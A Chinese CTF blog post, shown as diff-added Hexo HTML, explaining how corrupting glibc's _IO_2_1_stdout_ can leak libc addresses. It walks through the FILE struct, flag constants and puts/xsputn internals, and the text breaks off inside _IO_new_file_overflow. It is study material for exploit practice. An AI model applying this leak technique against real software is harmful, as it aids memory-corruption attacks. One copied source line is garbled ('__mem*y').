@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="jcxp">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="jcxp">
+    
+    <meta name="keywords" content="jcxp,hexo-theme,jcxp-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>利用_IO_2_1_stdout_泄露信息 · Jcxp&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Jcxp&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">利用_IO_2_1_stdout_泄露信息</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Jcxp's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            利用_IO_2_1_stdout_泄露信息
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "_IO_2_1_stdout_">_IO_2_1_stdout_</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">4k</span>Reading time: <span class="post-count reading-time">22 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/19</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在最近的ctf比赛中,出现了好几次无法通过输出泄露<code>libc</code>地址的题目,本文通过两道例题学习一下利用<code>_IO_2_1_stdout_</code>泄露信息.</p>
+<h2 id="FILE-介绍"><a href="#FILE-介绍" class="headerlink" title="FILE 介绍"></a>FILE 介绍</h2><p><code>FILE</code> 在 <code>Linux</code> 系统的标准<code>IO</code>库中是用于描述文件的结构，称为文件流。 <code>FILE</code>结构在程序执行 <code>fopen</code>等函数时会进行创建，并分配在堆中。我们常定义一个指向<code>FILE</code>结构的指针来接收这个返回值。</p>
+<p>FILE 结构定义在 libio.h 中:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>对于一个<code>FILE</code>结构体来说，最重要的元素就是<code>_flags</code>和<code>_fileno</code>，<code>_fileno</code>存储的是我们的文件描述符，对于某些情况或许我们要劫持<code>_fileno</code>才能达到我们的目的，而<code>_flags</code>则标志了该<code>FILE</code>的一些行为，这对于我们的泄露至关重要</p>
+<p><code>_flags</code>的高两位字节，这是由<code>libc</code>固定的，不同的 <code>libc</code>或许不同，但是大体相同，这就像一个文件的头标示符一样，标志这是一个什么文件，正如注释所说<code>High-order word is _IO_MAGIC; rest is flags.</code>，而低两位字节的位数规则可以参考下面代码  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don't delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don't call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>
+
+<p><code>_IO_2_1_stdout_</code>一般是这样的：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_MAGIC|_IO_IS_FILEBUF|_IO_CURRENTLY_PUTTING|_IO_LINKED|_IO_NO_READS | _IO_UNBUFFERED |_IO_USER_BUF</span><br></pre></td></tr></table></figure>
+
+<p><code>puts</code>函数内部实现过程如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里实际上是调用了<code>_IO_sputn</code>这个函数，当然这个<code>_IO_sputn</code>实际上就是一个宏，调用了<code>_IO_2_1_stdout_的vtable</code>中的<code>__xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">      <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (*--p == <span class="string">'\n'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          count = p - s + <span class="number">1</span>;</span><br><span class="line">          must_flush = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">    count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mem*y (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">    <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">       caller that everything has been written.  */</span></span><br><span class="line">    <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">    &#123;</span><br><span class="line">      count = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= count;</span><br><span class="line">      <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">        <span class="keyword">return</span> n - to_do;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">     buffer, but it's somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">     so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">    to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>
+
+<p>我们的目的是调用<code>_IO_OVERFLOW</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line"><span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br></pre></td></tr></table></figure>
+
+<p>之后调用到<code>_IO_new_file_overflow</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR 